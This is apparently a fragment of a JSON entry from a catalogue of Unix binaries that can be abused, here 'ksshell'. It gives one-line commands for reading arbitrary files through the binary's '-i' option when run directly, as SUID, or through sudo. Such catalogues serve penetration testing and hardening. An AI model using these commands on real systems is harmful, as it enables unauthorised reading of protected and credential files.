    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nksshell -i $LFILE\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
      }
    ]
  }
}
